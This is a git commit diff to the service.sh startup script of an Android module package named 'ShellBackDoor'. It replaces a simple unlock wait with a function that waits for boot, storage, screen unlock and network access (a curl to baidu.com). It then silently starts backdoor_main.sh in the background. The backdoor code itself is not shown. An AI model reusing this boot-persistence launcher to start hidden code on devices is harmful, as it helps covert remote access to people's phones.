c6e18dc0b479f2a7df3c38322f3e7e53cfe22510
execute-darker <116283163+execute-darker@users.noreply.github.com>
2024-10-05 03:03:26 +0800

    Replace the service wait function

--- ShellBackDoor_package/service.sh
+++ ShellBackDoor_package/service.sh
@@ -11,7 +11,26 @@
 # Global variables
 MODDIR="/data/adb/modules/darker_ShellBackDoor"
 
-# Waiting for data to be unlocked
-until [ -d /data/data/android ]; do sleep 1; done
+# Waiting for data to be unlocked and network ready
+wait_until_ready() {
+    while true; do
+        sleep 10
+        [ "$(getprop sys.boot_completed)" = "1" ] && break
+    done
+    while true; do
+        sleep 10
+        [ -d "/sdcard/Android" ] && break
+    done
+    while true; do
+        sleep 10
+        [ "$(dumpsys window | grep mDreamingLockscreen=true)" = "" ] && break
+    done
+    while true; do
+        sleep 10
+        [ "$($MODDIR/bin/curl -sLk www.baidu.com)" != "" ] && break
+    done
+}
+
+wait_until_ready
 
 "$MODDIR"/backdoor_main.sh 2>/dev/null &
